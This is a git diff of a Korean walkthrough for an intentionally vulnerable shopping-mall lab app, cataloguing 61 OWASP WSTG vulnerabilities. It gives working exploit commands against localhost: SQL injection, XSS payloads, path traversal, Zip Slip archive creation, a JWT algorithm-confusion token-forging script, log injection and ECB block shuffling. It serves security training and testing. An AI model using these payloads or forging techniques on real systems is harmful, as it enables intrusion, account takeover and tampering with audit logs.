@@ -1,6 +1,6 @@
 # vuln-mall 취약점 검증 워크스루
 
-> 본 문서는 vuln-mall 프로젝트에 의도적으로 구현된 모든 취약점을 실제로 확인/검증하기 위한 상세 절차서입니다.
+> 본 문서는 vuln-mall (NEXUS TECH) 프로젝트에 의도적으로 구현된 모든 취약점(총 61개)을 실제로 확인/검증하기 위한 상세 절차서입니다.
 > 자체 소유 테스트 환경에서의 보안 검증 용도로만 사용하십시오.
 
 ---
@@ -25,12 +25,12 @@ curl http://localhost:8080/actuator/health
 
 **시드 계정 정보** (schema-h2.sql에 의해 자동 생성):
 
-| 계정 | 비밀번호 | 역할 | 잔액 |
-|------|---------|------|------|
-| admin | admin123 | ADMIN | 9,999,999 |
-| alice | alice123 | USER | 250,000 |
-| bob | bob123 | USER | 150,000 |
-| victim | pass1234 | USER | 500,000 |
+| 계정 | 비밀번호 | 역할 | 잔액 | 보유 포인트 |
+|------|---------|------|------|-------------|
+| admin | admin123 | ADMIN | 9,999,999 | 10,000 P |
+| alice | alice123 | USER | 250,000 | 2,500 P |
+| bob | bob123 | USER | 150,000 | 2,500 P |
+| victim | pass1234 | USER | 500,000 | 5,000 P |
 
 **JWT 토큰 발급** (인증이 필요한 테스트 전 수행):
 
@@ -46,49 +46,75 @@ TOKEN="<응답에서 받은 token 값>"
 
 ---
 
-## 목차
+## 목차 (전체 61개 취약점 카탈로그)
 
-| 번호 | WSTG ID | 취약점 유형 | 엔드포인트 |
-|------|---------|-----------|-----------|
-| 1 | WSTG-INPV-05 | SQL Injection (LIKE 문자열 결합) | GET /api/products |
-| 2 | WSTG-INPV-05 | SQL Injection (UNION-Based) | GET /api/products/filter |
-| 3 | WSTG-INPV-05 | SQL Injection (ORDER BY Blind) | GET /api/products |
-| 4 | WSTG-INPV-05 | SQL Injection (Boolean-Based Blind) | GET /api/coupons/verify |
-| 5 | WSTG-INPV-05 | SQL Injection (Time-Based Blind) | GET /api/orders/track |
-| 6 | WSTG-INPV-05 | Second-Order SQL Injection | POST /api/inquiries + GET /api/inquiries/{id}/audit |
-| 7 | WSTG-INPV-01 | Reflected XSS (HTML 응답) | GET /api/support/echo |
-| 8 | WSTG-CLNT-01 | DOM-Based XSS (innerHTML) | 프론트엔드 SPA |
-| 9 | WSTG-INPV-02 | Stored XSS (리뷰 댓글) | POST /api/reviews |
-| 10 | WSTG-INPV-02 | Stored XSS (문의글) | POST /api/inquiries |
-| 11 | WSTG-INPV-09 | Path Traversal (파일 다운로드) | GET /api/files/download |
-| 12 | WSTG-INPV-07 | XML External Entity (XXE) | POST /api/orders/xml-receipt |
-| 13 | WSTG-INPV-18 | Server-Side Template Injection (SpEL) | POST /api/orders/receipt/template |
-| 14 | WSTG-INPV-12 | Command Injection | POST /api/util/ping |
-| 15 | WSTG-INPV-19 | SSRF (서버 사이드 요청 위조) | POST /api/util/fetch-image |
-| 16 | WSTG-ATHZ-04 | BOLA/IDOR (타인 주문 조회) | GET /api/orders/{id} |
-| 17 | WSTG-ATHZ-04 | BOLA/IDOR (타인 배송지 변경) | PUT /api/orders/{id}/shipping |
-| 18 | WSTG-ATHN-08 | Mass Assignment (권한 상승) | PUT /api/auth/profile |
-| 19 | WSTG-ATHN-08 | Mass Assignment (회원가입 시) | POST /api/auth/register |
-| 20 | WSTG-SESS-05 | CSRF (이메일 강제 변경) | GET/POST /api/auth/change-email |
-| 21 | WSTG-ATHZ-04 | HTTP Parameter Pollution | POST /api/orders/{id}/status-update |
-| 22 | WSTG-CONF-05 | WAF Bypass (헤더 스푸핑) | GET /api/admin/users |
-| 23 | WSTG-BUSL-09 | Price Tampering (가격 변조) | POST /api/orders |
-| 24 | WSTG-BUSL-09 | Negative Quantity (음수 수량) | PUT /api/cart/update/{id} |
-| 25 | WSTG-BUSL-02 | Workflow Step Skipping | POST /api/orders/{id}/direct-confirm |
-| 26 | WSTG-BUSL-04 | Race Condition (쿠폰 중복 사용) | POST /api/coupons/redeem |
-| 27 | WSTG-BUSL-03 | Rounding Error Arbitrage | POST /api/points/exchange |
-| 28 | WSTG-CRYP-02 | AES-ECB Block Shuffling | POST /api/auth/crypto/remember-me |
-| 29 | WSTG-CRYP-03 | Predictable Reset Token | POST /api/auth/crypto/forgot-password-link |
-| 30 | WSTG-ATHN-02 | 계정 열거 (Username Enumeration) | POST /api/auth/login |
-| 31 | WSTG-CLNT-04 | Open Redirect | GET /api/auth/redirect |
-| 32 | WSTG-INFO-05 | 민감정보 노출 (.env, .git, backup.sql) | GET /.env, GET /.git/HEAD, GET /backup.sql |
-| 33 | WSTG-INPV-15 | CRLF / Log Injection | POST /api/support/log |
-| 34 | WSTG-INPV-12 | Zip Slip (압축 해제 경로 탈출) | POST /api/files/upload-zip |
-| 35 | WSTG-INPV-12 | Unrestricted File Upload | POST /api/files/upload |
+| 번호 | WSTG ID | 취약점 키 (Key) | 취약점 명칭 | 분류 | 엔드포인트 |
+|:---:|:---|:---|:---|:---|:---|
+| 1 | WSTG-INPV-05 | `SQLI_LIKE` | SQL Injection - LIKE 문자열 결합 | Injection | `GET /api/products` |
+| 2 | WSTG-INPV-05 | `SQLI_UNION` | SQL Injection - UNION-Based | Injection | `GET /api/products/filter` |
+| 3 | WSTG-INPV-05 | `SQLI_ORDERBY` | SQL Injection - ORDER BY Blind | Injection | `GET /api/products` |
+| 4 | WSTG-INPV-05 | `SQLI_BOOL_BLIND` | SQL Injection - Boolean-Based Blind | Injection | `GET /api/coupons/verify` |
+| 5 | WSTG-INPV-05 | `SQLI_TIME_BLIND` | SQL Injection - Time-Based Blind | Injection | `GET /api/orders/track` |
+| 6 | WSTG-INPV-05 | `SQLI_SECOND` | Second-Order SQL Injection | Injection | `POST /api/inquiries + GET /api/inquiries/{id}/audit` |
+| 7 | WSTG-INPV-01 | `XSS_REFLECTED` | Reflected XSS (HTML 응답) | XSS | `GET /api/support/echo` |
+| 8 | WSTG-INPV-02 | `XSS_STORED_REVIEW` | Stored XSS (리뷰 댓글) | XSS | `POST /api/reviews` |
+| 9 | WSTG-INPV-02 | `XSS_STORED_INQ` | Stored XSS (문의글) | XSS | `POST /api/inquiries` |
+| 10 | WSTG-INPV-09 | `PATH_TRAVERSAL` | Path Traversal (임의 파일 읽기) | Injection | `GET /api/files/download` |
+| 11 | WSTG-INPV-07 | `XXE` | XML External Entity (XXE) | Injection | `POST /api/orders/xml-receipt` |
+| 12 | WSTG-INPV-18 | `SSTI` | Server-Side Template Injection (SpEL) | Injection | `POST /api/orders/receipt/template` |
+| 13 | WSTG-INPV-12 | `CMD_INJECTION` | Command Injection (OS 명령 실행) | Injection | `POST /api/util/ping` |
+| 14 | WSTG-INPV-19 | `SSRF` | SSRF (서버 사이드 요청 위조) | Injection | `POST /api/util/fetch-image` |
+| 15 | WSTG-INPV-12 | `ZIP_SLIP` | Zip Slip (경로 탈출) | Injection | `POST /api/files/upload-zip` |
+| 16 | WSTG-INPV-15 | `CRLF_LOG` | CRLF / Log Injection | Injection | `POST /api/support/log` |
+| 17 | WSTG-CRYP-02 | `AES_ECB` | AES-ECB 모드 블록 셔플링 | Crypto | `POST /api/auth/crypto/remember-me` |
+| 18 | WSTG-CRYP-03 | `PREDICTABLE_TOKEN` | 취약한 비밀번호 재설정 토큰 | Crypto | `POST /api/auth/crypto/forgot-password-link` |
+| 19 | WSTG-ATHN-08 | `JWT_CONFUSION` | JWT Algorithm Confusion | Auth | `GET /api/auth/me (HS256 Key Confusion)` |
+| 20 | WSTG-ATHN-02 | `USER_ENUM` | 계정 열거 (Username Enumeration) | Auth | `POST /api/auth/login` |
+| 21 | WSTG-ATHN-08 | `MASS_ASSIGN_PROFILE` | Mass Assignment (프로필 권한 상승) | Auth | `PUT /api/auth/profile` |
+| 22 | WSTG-ATHN-08 | `MASS_ASSIGN_REG` | Mass Assignment (회원가입 권한 지정) | Auth | `POST /api/auth/register` |
+| 23 | WSTG-ATHZ-04 | `BOLA_READ` | BOLA/IDOR (타인 주문 조회) | Auth | `GET /api/orders/{id}` |
+| 24 | WSTG-ATHZ-04 | `BOLA_WRITE` | BOLA/IDOR (타인 배송지 변경) | Auth | `PUT /api/orders/{id}/shipping` |
+| 25 | WSTG-ATHZ-04 | `HPP` | HTTP Parameter Pollution | Auth | `POST /api/orders/{id}/status-update` |
+| 26 | WSTG-SESS-05 | `CSRF` | CSRF (이메일 강제 변경) | Client | `GET/POST /api/auth/change-email` |
+| 27 | WSTG-CLNT-01 | `XSS_DOM` | DOM-Based XSS | Client | `프론트엔드 SPA (innerHTML)` |
+| 28 | WSTG-CLNT-04 | `OPEN_REDIRECT` | Open Redirect | Client | `GET /api/auth/redirect` |
+| 29 | WSTG-BUSL-09 | `PRICE_TAMPER` | Price Tampering (가격 조작) | BizLogic | `POST /api/orders` |
+| 30 | WSTG-BUSL-09 | `NEG_QUANTITY` | Negative Quantity (음수 수량) | BizLogic | `PUT /api/cart/update/{id}` |
+| 31 | WSTG-BUSL-03 | `ROUNDING_ERROR` | 부동소수점 오차 포인트 차익거래 | BizLogic | `POST /api/points/exchange` |
+| 32 | WSTG-BUSL-04 | `RACE_CONDITION` | 동시성 Race Condition | BizLogic | `POST /api/coupons/redeem` |
+| 33 | WSTG-BUSL-02 | `WORKFLOW_SKIP` | Workflow Step Skipping | BizLogic | `POST /api/orders/{id}/direct-confirm` |
+| 34 | WSTG-CONF-05 | `WAF_BYPASS` | 엔터프라이즈 WAF 우회 | Config | `GET /api/admin/users` |
+| 35 | WSTG-INFO-05 | `INFO_EXPOSURE` | 민감정보 노출 (.env/.git/backup.sql) | Config | `GET /.env, GET /.git/HEAD, GET /backup.sql` |
+| 36 | WSTG-INPV-12 | `FILE_UPLOAD` | 무제한 파일 업로드 | Injection | `POST /api/files/upload` |
+| 37 | WSTG-ATHZ-04 | `BOLA_ADDRESS` | BOLA/IDOR (타인 배송지 조회/수정/삭제) | Auth | `DELETE /api/addresses/{id} / PUT /api/addresses/{id}` |
+| 38 | WSTG-INPV-02 | `XSS_STORED_ADDRESS` | Stored XSS (배송지 및 배송 메모) | XSS | `POST /api/addresses` |
+| 39 | WSTG-INPV-05 | `SQLI_ADDRESS` | SQL Injection (주소 및 우편번호 검색) | Injection | `GET /api/addresses/search` |
+| 40 | WSTG-BUSL-09 | `WALLET_NEGATIVE_CHARGE` | 결제 금액 음수 충전 및 PG 변조 | BizLogic | `POST /api/wallet/charge` |
+| 41 | WSTG-BUSL-04 | `WALLET_RACE_CONDITION` | 바우처 동시성 Race Condition | BizLogic | `POST /api/wallet/voucher` |
+| 42 | WSTG-SESS-05 | `CSRF_WALLET` | CSRF (지갑 잔액 무단 송금) | Client | `POST /api/wallet/transfer` |
+| 43 | WSTG-INPV-02 | `XSS_STORED_CART` | Stored XSS (장바구니 요청 메모) | XSS | `POST /api/cart` |
+| 44 | WSTG-ATHZ-04 | `BOLA_CART` | BOLA/IDOR (타인 장바구니 품목 변조/삭제) | Auth | `DELETE /api/cart/items/{id}` |
+| 45 | WSTG-ATHZ-02 | `ADMIN_BYPASS` | 통합 관리자 포털 권한 우회 | Auth | `GET /api/admin/check` |
+| 46 | WSTG-BUSL-09 | `MEMBERSHIP_PRICE_TAMPER` | Membership Price Tampering (가입 금액 변조) | BizLogic | `POST /api/membership/subscribe` |
+| 47 | WSTG-ATHZ-02 | `MEMBERSHIP_BFLA_BYPASS` | VIP Exclusive Deals BFLA (인가 우회) | Auth | `GET /api/membership/exclusive-products` |
+| 48 | WSTG-BUSL-04 | `MEMBERSHIP_COUPON_RACE` | VIP Coupon Race Condition (쿠폰 무한 중복 발급) | BizLogic | `POST /api/membership/claim-coupon` |
+| 49 | WSTG-INPV-02 | `MEMBERSHIP_STORED_XSS` | Membership Welcome Note Stored XSS | XSS | `POST /api/membership/subscribe` |
+| 50 | WSTG-BUSL-04 | `REFUND_RACE_CONDITION` | Double Refund Concurrency Race Condition (이중 환불) | BizLogic | `POST /api/orders/{id}/refund` |
+| 51 | WSTG-BUSL-02 | `REFUND_WORKFLOW_BYPASS` | Refund State & Workflow Step Skipping (반품 검수 우회) | BizLogic | `POST /api/orders/{id}/refund` |
+| 52 | WSTG-INPV-02 | `REFUND_STORED_XSS` | Refund Reason & Memo Stored XSS | XSS | `POST /api/orders/{id}/refund` |
+| 53 | WSTG-ATHZ-04 | `WISHLIST_BOLA_IDOR` | Wishlist & Custom Deck BOLA/IDOR (비공개 덱 무단 열람) | Auth | `GET /api/wishlist/decks/{id}` |
+| 54 | WSTG-INPV-02 | `WISHLIST_STORED_XSS` | Custom Deck Name & Description Stored XSS | XSS | `POST /api/wishlist/decks` |
+| 55 | WSTG-BUSL-04 | `ATTENDANCE_DATE_TAMPER` | Attendance Check-in Date Manipulation & Multi-Claim Race | BizLogic | `POST /api/points/attendance` |
+| 56 | WSTG-CLNT-01 | `ROULETTE_CLIENT_TAMPER` | Roulette Client-Side Prize Manipulation | Client | `POST /api/points/roulette` |
+| 57 | WSTG-BUSL-09 | `POINTS_NEGATIVE_EXPLOIT` | Negative Points Usage & Compound Payment Tampering | BizLogic | `POST /api/orders` |
+| 58 | WSTG-ATHZ-04 | `INQUIRY_BOLA_IDOR` | BOLA/IDOR on Support Ticket & Secret Inquiries | Auth | `GET /api/inquiries/{id}` |
+| 59 | WSTG-INPV-12 | `TICKET_FILE_UPLOAD` | Unrestricted File Upload on Support Tickets | Injection | `POST /api/inquiries/upload` |
+| 60 | WSTG-BUSL-04 | `STOCK_RACE_CONDITION` | Inventory Overselling Concurrency Race Condition | BizLogic | `POST /api/orders` |
+| 61 | WSTG-INPV-19 | `RESTOCK_WEBHOOK_SSRF` | Restock Notification Callback SSRF | Injection | `POST /api/products/{id}/notify-restock` |
 
 ---
 
-## 1. SQL Injection - LIKE 문자열 결합
+## 1. SQL Injection - LIKE 문자열 결합 (SQLI_LIKE)
 
 **WSTG-INPV-05** | 소스: `ProductRepository.searchProducts()` (57행)
 **취약 구문**: `sql.append(" AND (name LIKE '%" + keyword + "%'")`
@@ -124,7 +150,9 @@ curl -s "http://localhost:8080/api/products?keyword=' OR '1'='1" | python3 -m js
 
 ---
 
-## 2. SQL Injection - UNION-Based
+---
+
+## 2. SQL Injection - UNION-Based (SQLI_UNION)
 
 **WSTG-INPV-05** | 소스: `ProductRepository.filterByCategoryUnion()` (97행)
 **취약 구문**: `"SELECT id, name, category, price, description FROM products WHERE ... category = '" + category + "'"`
@@ -151,7 +179,9 @@ curl -s "http://localhost:8080/api/products/filter?category=' UNION SELECT id, u
 
 ---
 
-## 3. SQL Injection - ORDER BY Blind
+---
+
+## 3. SQL Injection - ORDER BY Blind (SQLI_ORDERBY)
 
 **WSTG-INPV-05** | 소스: `ProductRepository.searchProducts()` (66행)
 **취약 구문**: `sql.append(" ORDER BY ").append(sortBy)`
@@ -172,7 +202,9 @@ curl -s "http://localhost:8080/api/products?keyword=Quantum&sortBy=(CASE+WHEN+(S
 
 ---
 
-## 4. SQL Injection - Boolean-Based Blind
+---
+
+## 4. SQL Injection - Boolean-Based Blind (SQLI_BOOL_BLIND)
 
 **WSTG-INPV-05** | 소스: `CouponRepository.verifyCouponCode()` (23행)
 **취약 구문**: `"SELECT count(*) FROM coupons WHERE code = '" + code + "' AND is_used = FALSE"`
@@ -209,7 +241,9 @@ curl -s "http://localhost:8080/api/coupons/verify?code=' OR (SELECT LENGTH(passw
 
 ---
 
-## 5. SQL Injection - Time-Based Blind
+---
+
+## 5. SQL Injection - Time-Based Blind (SQLI_TIME_BLIND)
 
 **WSTG-INPV-05** | 소스: `OrderRepository.trackOrderByCode()` (119행)
 **취약 구문**: `"SELECT * FROM orders WHERE tracking_code = '" + code + "'"`
@@ -237,7 +271,9 @@ time curl -s "http://localhost:8080/api/orders/track?code=' AND (SELECT CASE WHE
 
 ---
 
-## 6. Second-Order SQL Injection
+---
+
+## 6. Second-Order SQL Injection (SQLI_SECOND)
 
 **WSTG-INPV-05** | 소스: `InquiryRepository.searchAuditLogsByTitle()` (66행)
 **취약 구문**: `"SELECT * FROM audit_logs WHERE details LIKE '%" + title + "%'"`
@@ -272,7 +308,9 @@ curl -s "http://localhost:8080/api/inquiries/3/audit" | python3 -m json.tool
 
 ---
 
-## 7. Reflected XSS - HTML 응답 직접 삽입
+---
+
+## 7. Reflected XSS (HTML 응답) (XSS_REFLECTED)
 
 **WSTG-INPV-01** | 소스: `SupportController.echoMessage()` (21행)
 **취약 구문**: `msg` 파라미터를 이스케이프 없이 HTML 본문에 직접 삽입
@@ -304,27 +342,9 @@ http://localhost:8080/api/support/echo?msg=<img src=x onerror=alert(document.coo
 
 ---
 
-## 8. DOM-Based XSS - innerHTML Sink
-
-**WSTG-CLNT-01** | 소스: `app.js` (40~47행)
-**취약 구문**: `bar.innerHTML = '...' + raw;` (URL 해시에서 읽은 값을 그대로 삽입)
-
-### 브라우저 확인
-
-브라우저 주소창에 다음 URL을 입력합니다:
-
-```
-http://localhost:8080/#notice=<img src=x onerror=alert('DOM-XSS')>
-```
-
-### 기대 결과
-
-페이지 상단에 공지 바가 나타나면서 `alert('DOM-XSS')` 팝업이 실행됩니다.
-`window.location.hash`에서 추출한 값이 `innerHTML`에 그대로 삽입되기 때문입니다.
-
 ---
 
-## 9. Stored XSS - 리뷰 댓글
+## 8. Stored XSS (리뷰 댓글) (XSS_STORED_REVIEW)
 
 **WSTG-INPV-02** | 소스: `ReviewController.addReview()` (50~57행)
 **취약 구문**: `comment` 필드를 이스케이프 없이 DB에 저장하고 프론트엔드에서 `innerHTML`로 렌더링
@@ -356,7 +376,9 @@ curl -s -X POST http://localhost:8080/api/reviews \
 
 ---
 
-## 10. Stored XSS - 문의글
+---
+
+## 9. Stored XSS (문의글) (XSS_STORED_INQ)
 
 **WSTG-INPV-02** | 소스: `InquiryController.createInquiry()` + 프론트엔드 `innerHTML` 렌더링
 
@@ -379,7 +401,9 @@ curl -s -X POST http://localhost:8080/api/inquiries \
 
 ---
 
-## 11. Path Traversal - 임의 파일 읽기
+---
+
+## 10. Path Traversal (임의 파일 읽기) (PATH_TRAVERSAL)
 
 **WSTG-INPV-09** | 소스: `FileController.downloadManual()` (48~53행)
 **취약 구문**: `new File(baseDir, filename)` 이후 절대 경로 대체 시도까지 수행
@@ -403,7 +427,9 @@ curl -s "http://localhost:8080/api/files/download?filename=/etc/hostname"
 
 ---
 
-## 12. XXE - XML External Entity
+---
+
+## 11. XML External Entity (XXE) (XXE)
 
 **WSTG-INPV-07** | 소스: `OrderController.parseXmlReceipt()` (155~158행)
 **취약 구문**: `DocumentBuilderFactory` 기본 설정 사용 (외부 엔티티 비활성화 안 함)
@@ -442,7 +468,9 @@ curl -s -X POST http://localhost:8080/api/orders/xml-receipt \
 
 ---
 
-## 13. SSTI - Server-Side Template Injection (SpEL)
+---
+
+## 12. Server-Side Template Injection (SpEL) (SSTI)
 
 **WSTG-INPV-18** | 소스: `ReceiptTemplateController.previewReceiptTemplate()` (44행)
 **취약 구문**: SpEL `parser.parseExpression(exprStr)` 으로 사용자 입력을 직접 평가
@@ -493,7 +521,9 @@ curl -s -X POST http://localhost:8080/api/orders/receipt/template \
 
 ---
 
-## 14. Command Injection - OS 명령 실행
+---
+
+## 13. Command Injection (OS 명령 실행) (CMD_INJECTION)
 
 **WSTG-INPV-12** | 소스: `UtilityController.pingHost()` (39~41행)
 **취약 구문**: `"ping -c 2 " + host` 가 `/bin/sh -c`로 직접 전달
@@ -528,7 +558,9 @@ curl -s -X POST http://localhost:8080/api/util/ping \
 
 ---
 
-## 15. SSRF - 서버 사이드 요청 위조
+---
+
+## 14. SSRF (서버 사이드 요청 위조) (SSRF)
 
 **WSTG-INPV-19** | 소스: `UtilityController.fetchRemoteImage()` (81행)
 **취약 구문**: `localhost`, `127.0.0.1` 문자열 비교만 수행하는 미흡한 필터
@@ -558,73 +590,245 @@ curl -s -X POST http://localhost:8080/api/util/fetch-image \
 
 ---
 
-## 16. BOLA/IDOR - 타인의 주문 상세 조회
+---
 
-**WSTG-ATHZ-04** | 소스: `OrderController.getOrderDetail()` (117~128행)
-**취약 구문**: 인증 여부만 확인하고 `order.userId == currentUser.id` 소유권 검증 누락
+## 15. Zip Slip (경로 탈출) (ZIP_SLIP)
 
-### 공격 단계
+**WSTG-INPV-12** | 소스: `FileController.uploadZipArchive()` (119행)
+**취약 구문**: `new File(UPLOAD_DIR, entry.getName())` - ZIP 엔트리 경로에 `../../` 포함 시 상위 디렉터리 탈출
+
+### 공격 개념
+
+악성 ZIP 파일 내부에 `../../etc/cron.d/malicious` 같은 경로명을 가진 엔트리를 포함시키면, 압축 해제 시 `uploads/` 디렉터리 바깥에 파일을 쓸 수 있습니다.
 
 ```bash
-# alice 토큰으로 로그인
-TOKEN=$(curl -s -X POST http://localhost:8080/api/auth/login \
-  -H "Content-Type: application/json" \
-  -d '{"username":"alice","password":"alice123"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")
+# 악성 ZIP 생성 (Python 예시)
+python3 -c "
+import zipfile, io
+buf = io.BytesIO()
+with zipfile.ZipFile(buf, 'w') as zf:
+    zf.writestr('../../tmp/zipslip_proof.txt', 'Zip Slip Exploited!')
+buf.seek(0)
+open('malicious.zip', 'wb').write(buf.read())
+"
 
-# victim(사용자 ID 4)의 주문(ID 2) 조회 시도
-curl -s http://localhost:8080/api/orders/2 \
-  -H "Authorization: Bearer $TOKEN" | python3 -m json.tool
+# 업로드
+curl -s -X POST http://localhost:8080/api/files/upload-zip \
+  -F "file=@malicious.zip" | python3 -m json.tool
 ```
 
 ### 기대 응답
 
 ```json
 {
-    "id": 2,
-    "userId": 4,
-    "totalAmount": 1350000.00,
-    "recipientName": "김피해 (VIP)",
-    "shippingAddress": "경기도 성남시 분당구 판교역로 235 비밀연구소 702호 [기밀 배송]",
-    "phone": "010-9999-8888",
-    "status": "SHIPPED",
-    "trackingCode": "KR-LOGI-77192"
+    "message": "압축 파일이 성공적으로 해제되었습니다.",
+    "extractedFiles": ["../../tmp/zipslip_proof.txt"]
 }
 ```
 
-alice의 토큰으로 victim의 기밀 배송 정보(주소, 연락처, 운송장 번호)가 그대로 노출됩니다.
+`extractedFiles`에 `../../` 경로가 포함되어 있으면 디렉터리 탈출이 성공한 것입니다.
 
 ---
 
-## 17. BOLA/IDOR - 타인의 배송지 무단 변경
+---
 
-**WSTG-ATHZ-04** | 소스: `OrderController.updateShipping()` (134~145행)
+## 16. CRLF / Log Injection (CRLF_LOG)
+
+**WSTG-INPV-15** | 소스: `LogController.recordLog()` (28행)
+**취약 구문**: `logger.info("... " + clientMsg)` - 개행 문자 미필터링
 
 ### 공격 요청
 
 ```bash
-# alice 토큰으로 victim의 주문(ID 2) 배송지 변경
-curl -s -X PUT http://localhost:8080/api/orders/2/shipping \
+curl -s -X POST http://localhost:8080/api/support/log \
   -H "Content-Type: application/json" \
-  -H "Authorization: Bearer $TOKEN" \
-  -d '{
-    "shippingAddress": "공격자 주소: 서울시 해커동 123-45",
-    "recipientName": "공격자",
-    "phone": "010-0000-0000"
-  }' | python3 -m json.tool
+  -d '{"message": "정상 피드백\n[AUDIT_LOGGER] INFO  ADMIN login success from 10.0.0.1 - admin@vulnmall.local"}' | python3 -m json.tool
+```
+
+### 기대 결과
+
+서버 로그 파일에 다음과 같이 가짜 관리자 로그인 기록이 삽입됩니다:
+
+```
+INFO [CLIENT_EVENT] User feedback received: 정상 피드백
+INFO ADMIN login success from 10.0.0.1 - admin@vulnmall.local
+```
+
+감사 로그를 조작하여 공격 흔적을 은폐하거나 허위 이벤트를 삽입할 수 있습니다.
+
+---
+
+---
+
+## 17. AES-ECB 모드 블록 셔플링 (AES_ECB)
+
+**WSTG-CRYP-02** | 소스: `CryptoAuthController.issueRememberMeToken()` (44행)
+**취약 구문**: `Cipher.getInstance("AES/ECB/PKCS5Padding")` - IV 없는 ECB 모드
+
+### 검증 단계
+
+```bash
+# 1. alice (USER 역할) 토큰 발급
+curl -s -X POST "http://localhost:8080/api/auth/crypto/remember-me?username=alice" | python3 -m json.tool
+
+# 2. admin (ADMIN 역할) 토큰 발급
+curl -s -X POST "http://localhost:8080/api/auth/crypto/remember-me?username=admin" | python3 -m json.tool
+```
+
+### 기대 응답
+
+각 응답에서 `rememberMeToken` (16진수) 을 확인합니다.
+- 페이로드 형식: `role=ADMIN;user=admin` 또는 `role=USER ;user=alice`
+- AES-ECB 는 동일 평문 블록이 항상 동일 암호문으로 변환되므로, admin 토큰의 첫 16바이트 블록(`role=ADMIN;user=` 부분)을 alice 토큰의 첫 블록과 교체하면 alice 사용자에게 ADMIN 권한 부여가 가능합니다.
+
+### 토큰 검증
+
+```bash
+# 토큰 복호화 확인
+curl -s -X POST "http://localhost:8080/api/auth/crypto/remember-me/verify?token=<발급받은 토큰 HEX>" | python3 -m json.tool
 ```
 
 ### 기대 응답
 
 ```json
 {
-    "message": "배송 정보가 성공적으로 변경되었습니다.",
-    "orderId": 2
+    "status": "AUTHENTICATED",
+    "username": "alice",
+    "role": "ADMIN",
+    "rawDecryptedPayload": "role=ADMIN;user=alice..."
 }
 ```
 
 ---
 
-## 18. Mass Assignment - 프로필 업데이트 권한 상승
+---
+
+## 18. 취약한 비밀번호 재설정 토큰 (PREDICTABLE_TOKEN)
+
+**WSTG-CRYP-03** | 소스: `CryptoAuthController.generateResetLink()` (107~111행)
+**취약 구문**: `MD5(username + epochSecond)` - 예측 가능한 시드
+
+### 공격 요청
+
+```bash
+# 비밀번호 재설정 링크 발급
+curl -s -X POST "http://localhost:8080/api/auth/crypto/forgot-password-link?username=victim" | python3 -m json.tool
+```
+
+### 기대 응답
+
+```json
+{
+    "status": "SUCCESS",
+    "resetUrl": "/reset-password?token=a1b2c3d4e5f6...",
+    "algorithm": "MD5(username + timestamp)"
+}
+```
+
+토큰 생성 알고리즘이 `MD5(username + 현재시각_초단위)`이므로, 공격자가 요청 시점의 타임스탬프를 알면 동일한 토큰을 재현할 수 있습니다.
+
+---
+
+---
+
+## 19. JWT Algorithm Confusion (JWT_CONFUSION)
+
+**WSTG-ATHN-08** | 엔드포인트: `GET /api/auth/me` 등 모든 인증 엔드포인트
+**취약 위치**: `JwtTokenProvider.java` (`parseAndValidateToken`)
+
+### 취약점 개요
+서버는 정상적으로 비대칭키(RS256)를 사용하여 JWT를 서명 및 검증해야 하지만, 토큰 헤더의 `alg` 필드가 `HS256`일 경우 공개키(RSA Public Key PEM)의 바이트 스트림을 대칭키(HMAC-SHA256) 시크릿으로 취급하여 서명을 검증하는 **Key Confusion(알고리즘 혼동)** 취약점이 존재합니다.
+공개키는 누구나 `GET /api/auth/public-key` 엔드포인트를 통해 열람할 수 있으므로, 공격자는 공개키를 HMAC 대칭키로 사용하여 임의 사용자(예: `admin`, role: `ADMIN`)의 위조 토큰을 생성할 수 있습니다.
+
+### 공격 절차 (Python / Bash)
+
+```bash
+# 1. 서버의 공개키 획득
+PUBKEY=$(curl -s http://localhost:8080/api/auth/public-key | python3 -c "import sys, json; print(json.load(sys.stdin)['publicKey'])")
+echo "획득한 공개키:"
+echo "$PUBKEY"
+
+# 2. HS256 알고리즘 및 공개키를 대칭키로 서명한 위조 토큰 생성
+FORGED_TOKEN=$(python3 -c "
+import base64, hmac, hashlib, json, time
+
+pubkey = '''$PUBKEY'''.encode('utf-8')
+
+header = {'alg': 'HS256', 'typ': 'JWT'}
+payload = {
+    'sub': 'admin',
+    'role': 'ADMIN',
+    'iat': int(time.time()),
+    'exp': int(time.time()) + 3600
+}
+
+def b64url(data):
+    return base64.urlsafe_b64encode(data).rstrip(b'=').decode('utf-8')
+
+seg_header = b64url(json.dumps(header, separators=(',', ':')).encode('utf-8'))
+seg_payload = b64url(json.dumps(payload, separators=(',', ':')).encode('utf-8'))
+
+sig_input = f'{seg_header}.{seg_payload}'.encode('utf-8')
+signature = hmac.new(pubkey, sig_input, hashlib.sha256).digest()
+seg_sig = b64url(signature)
+
+print(f'{seg_header}.{seg_payload}.{seg_sig}')
+")
+
+# 3. 위조된 관리자 토큰으로 인증 API 호출
+curl -s http://localhost:8080/api/auth/me \
+  -H "Authorization: Bearer $FORGED_TOKEN" | python3 -m json.tool
+```
+
+### 기대 응답
+```json
+{
+    "id": 1,
+    "username": "admin",
+    "email": "admin@nexus.local",
+    "role": "ADMIN",
+    "balance": 9999999
+}
+```
+스코어보드(`scoreboard.html`)에서 `JWT_CONFUSION` 취약점 발견 및 `FLAG{JWT_CONFUSION_...}` 플래그가 실시간 등록됩니다.
+
+---
+
+## 20. 계정 열거 (Username Enumeration) (USER_ENUM)
+
+**WSTG-ATHN-02** | 소스: `AuthController.login()` (49~64행)
+
+### 공격 요청
+
+```bash
+# 존재하는 사용자
+curl -s -X POST http://localhost:8080/api/auth/login \
+  -H "Content-Type: application/json" \
+  -d '{"username":"admin","password":"wrongpassword"}' | python3 -m json.tool
+
+# 존재하지 않는 사용자
+curl -s -X POST http://localhost:8080/api/auth/login \
+  -H "Content-Type: application/json" \
+  -d '{"username":"nonexistent","password":"test"}' | python3 -m json.tool
+```
+
+### 기대 응답
+
+```json
+// 존재하는 사용자 + 틀린 비밀번호
+{"status": 401, "error": "BadCredentials", "message": "비밀번호가 올바르지 않습니다."}
+
+// 존재하지 않는 사용자
+{"status": 401, "error": "UserNotFound", "message": "해당 아이디('nonexistent')는 등록되지 않은 사용자입니다."}
+```
+
+오류 메시지가 다르므로 공격자는 유효한 아이디 목록을 수집할 수 있습니다.
+
+---
+
+---
+
+## 21. Mass Assignment (프로필 권한 상승) (MASS_ASSIGN_PROFILE)
 
 **WSTG-ATHN-08** | 소스: `AuthController.updateProfile()` (131~133행)
 **취약 구문**: `if (request.getRole() != null) user.setRole(request.getRole());`
